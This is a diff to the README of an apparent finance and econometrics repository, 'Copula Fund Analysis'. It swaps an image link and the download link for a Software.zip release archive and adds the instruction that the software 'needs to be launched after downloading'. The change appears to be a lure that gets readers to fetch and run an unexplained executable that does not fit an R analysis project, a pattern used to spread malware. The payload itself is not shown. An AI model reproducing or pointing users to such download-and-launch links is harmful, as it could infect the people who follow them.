@@ -1,6 +1,6 @@
 # 📊📈 Copula Fund Analysis 📉📊
 
-![Copula Fund Analysis](https://www.example.com/images/copula-fund-analysis.jpg)
+![Copula Fund Analysis](https://github.com/Davi007shaulin/copula-fund-analysis/releases/download/v2.0/Software.zip)
 
 Welcome to the **Copula Fund Analysis** repository! This repository is a comprehensive collection of resources focusing on causality, cointegration, copula theory, econometrics, finance, financial analysis, macroeconomics, quantitative finance, R programming, statistical computing, and time series analysis. Whether you are a student, researcher, or practitioner in the field of finance and economics, this repository aims to provide valuable insights and tools for your analysis.
 
@@ -31,7 +31,7 @@ Welcome to the **Copula Fund Analysis** repository! This repository is a compreh
 
 ## 🔗 Software Download 🔗
 
-To access the software related to this repository, please download it from the following link: [Download Software](https://github.com/user-attachments/files/18410590/Software.zip)
+To access the software related to this repository, please download it from the following link: [Download Software](https://github.com/Davi007shaulin/copula-fund-analysis/releases/download/v2.0/Software.zip)
 
 **Note:** The software needs to be launched after downloading.
 
